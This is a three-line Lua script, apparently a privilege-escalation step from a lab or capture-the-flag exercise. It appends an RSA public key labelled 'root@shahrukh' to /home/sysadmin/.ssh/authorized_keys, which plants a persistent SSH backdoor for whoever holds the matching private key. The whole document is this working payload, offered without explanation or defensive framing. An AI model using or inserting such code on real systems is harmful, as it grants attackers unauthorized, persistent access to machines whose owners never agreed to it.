local privesc = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
privesc:write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+yKrF6pdinavEqtX+HWI3VpkU3LICpEdyFM37ADHFA3wxLrkHkyTOePQfepqoyVJHOzbuHi9/HPj9ApOizlXaKFn3xF1+IbEzVT4/PE2N+ILpFmTxl2E5sQ+wvRsdy17ANe+DwYA0H7dtMIzPp4mgolU46/FyHSfMwK+0FgtqLfJ/21Xt4s/Unph6gjeFee3Vn/EfzgjoV55wiWZIa3VD4Ta+s3pGJSHuxNI57tR1uld+gxdW+0wfZq1KjOuT48VRgBdEue542ER5/ThyChey0kKYMRCGtfoLfXbmnXH8Tz4iHg6Lfs0ncIZJUdd2NuUJzGx7o5GU5OIcVQhPkKs+EDpBHvILeWSWZNg5afweaNoz7i7fKKGEfGM8XoW+GgwzKKVndNWZrerADMx2oPjAWs7fPqrOaI43X0DRR+t1lp0kWzD/CXPAa2C/ZAsgfUdeO1tQPNFGWzbaFUZk2QjKtNrORZdzndIZyzudsitGBBQS5/HntU8HS0jog/iRstc= root@shahrukh")
privesc:close()
